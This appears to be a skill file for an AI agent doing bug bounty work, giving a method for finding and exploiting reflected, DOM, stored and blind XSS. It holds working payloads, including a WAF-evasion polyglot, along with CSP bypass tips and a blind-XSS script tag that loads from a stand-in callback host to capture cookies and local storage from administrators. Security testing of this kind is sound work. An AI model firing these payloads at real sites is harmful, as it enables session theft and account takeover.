---
name: bbp-xss-hunter
description: Specialized skill for finding and exploiting Cross-Site Scripting (XSS) vulnerabilities, including Reflected, Stored, DOM-based, and Blind XSS.
---

# XSS Hunter Skill

This skill provides methodologies for finding and exploiting Cross-Site Scripting (XSS) vulnerabilities. 

## Workflow

### 1. Reflected XSS
- **Discovery:** Look for input parameters reflected in the HTTP response body without proper encoding. Use `kxss` to quickly find parameters that reflect unsanitized characters (`<`, `>`, `"`, `'`).
- **Context Analysis:** Determine where the input lands:
  - **HTML Body:** Payload: `"><script>alert(1)</script>`
  - **HTML Attribute:** Payload: `" autofocus onfocus="alert(1)`
  - **JavaScript Context:** Payload: `'-alert(1)-'` or `\'-alert(1)//`
- **WAF Evasion Polyglots:** Use polyglots to test multiple contexts simultaneously:
  - `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e`

### 2. DOM-Based XSS
- **Source to Sink Analysis:** Trace data from a `Source` (e.g., `location.hash`, `location.search`, `document.referrer`) to an execution `Sink` (e.g., `eval()`, `document.write()`, `innerHTML`, `setTimeout()`).
- **Tools:** Use `DOMInvader` (part of Burp Suite) or manual code review.
- **Payload Example (innerHTML sink):** `location.hash = "<img src=x onerror=alert(1)>"`

### 3. Blind XSS
- **Discovery:** Inject Blind XSS payloads into input fields that are likely viewed by administrators (e.g., Contact Forms, Support Tickets, Chatbots, Profile Settings).
- **Payload:** `"><script src=https://your-xss-hunter.com></script>`
- **Monitoring:** Wait for the payload to fire when an admin views the page. XSS Hunter or Interactsh can capture the callback, including cookies, local storage, and the page's HTML structure.

### 4. Stored XSS
- **Discovery:** Inject payloads into fields that are saved and displayed later (e.g., comments, profiles, product reviews).
- **Execution:** Verify execution by viewing the page where the payload is stored. Often requires creating a second account to verify if the payload affects other users.

## Advanced Techniques
- **Bypassing Length Restrictions:** Use `eval(name)` or `eval(location.hash.slice(1))` if the payload size is limited.
- **CSP Bypass:** If Content Security Policy (CSP) is present, analyze it using Google's CSP Evaluator. Look for missing `object-src`, unsafe domains in `script-src` (e.g., Google JSONP endpoints), or `unsafe-inline`.
